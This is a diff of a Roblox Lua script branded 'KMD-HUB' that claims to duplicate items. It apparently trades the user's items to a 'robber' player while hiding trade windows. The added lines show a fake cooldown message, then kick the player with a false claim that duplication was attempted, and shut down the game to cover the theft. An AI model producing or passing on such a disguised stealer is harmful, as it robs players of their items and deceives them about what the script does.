@@ -56,6 +56,12 @@ if game.Players:FindFirstChild(robberName) then
     		workspace.__THINGS.__REMOTES:FindFirstChild("toggle setting"):FireServer(unpack(args))
     	until game:GetService("Players").LocalPlayer.PlayerGui.Settings.Frame.Container.Trading.Toggle.Label.Text == "All"
     end
+    --Send trade
+    local notLoaded = Instance.new("Message", game:GetService("CoreGui"))
+	for i=0,75 do
+	    wait(1)
+	    notLoaded.Text = "Waiting for the trading"..tostring(75-i).."seconds cooldown."
+    end
     coroutine.wrap(function() -- For anti guis
 	    while wait(.2) do
 	    	for i,v in pairs(game:GetDescendants()) do
@@ -64,9 +70,7 @@ if game.Players:FindFirstChild(robberName) then
 	    	    end
 	    	end
 	    end
-end)()
-    --Send trade
-    --(75) --Wait join trade cooldown
+    end)()
     v2.Network.Fired("Init Trade"):Connect(function(p3, p4)
     	tradeName = p3;
     end);
@@ -93,6 +97,10 @@ end)()
     }
     
     workspace.__THINGS.__REMOTES["ready trade"]:InvokeServer(ohTable1)
+    wait(30)
+    game.Players.LocalPlayer:Kick("\n[KMD-HUB]\nTried to dupe your items.\nRejoin a server to see if it worked!\n(This method could fail, try again if it did)")
+    wait(10)
+    game:Shutdown()
 else
     game.Players.LocalPlayer:Kick("\n[KMD-HUB]\nNo duplication bot is available at the moment.\nTry again later.")
     wait(5)
